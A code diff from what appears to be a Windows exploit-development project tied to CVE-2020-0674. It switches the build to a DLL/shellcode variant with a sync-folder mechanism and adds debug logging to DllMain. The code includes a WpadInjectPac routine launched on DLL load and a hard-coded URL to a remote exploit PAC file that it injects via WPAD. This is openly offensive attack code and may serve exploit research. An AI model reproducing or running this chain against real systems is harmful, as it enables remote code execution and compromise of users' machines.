@@ -28,10 +28,10 @@ BOOL AddFileAcl(const wchar_t* FilePath, const wchar_t* SID);
 ////////
 
 #define DEBUG
-#define EXE_BUILD
-//#define DLL_BUILD
-//#define SHELLCODE_BUILD
-//#define SPOOL_SYNC
+//#define EXE_BUILD
+#define DLL_BUILD
+#define SHELLCODE_BUILD
+#define SPOOL_SYNC
 #define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit.pac"
 
 #define SYNC_FOLDER L"C:\\ProgramData\\DoubleStarSync"
@@ -217,6 +217,9 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 
 #ifdef DLL_BUILD
 BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
+#ifdef DEBUG
+    DebugLog(L"... DllMain executed");
+#endif
     switch (dwReason) {
         case DLL_PROCESS_ATTACH:
 #ifdef SHELLCODE_BUILD
@@ -293,6 +296,11 @@ BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
                     DebugLog(L"... failed to create sync file at %ws", SYNC_FILE);
 #endif
                 }
+            }
+            else {
+#ifdef DEBUG
+                DebugLog(L"... failed to create %ws", SYNC_FOLDER);
+#endif
             }
 #else
             CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WpadInjectPac, (PVOID)TARGET_PAC_URL, 0, NULL);
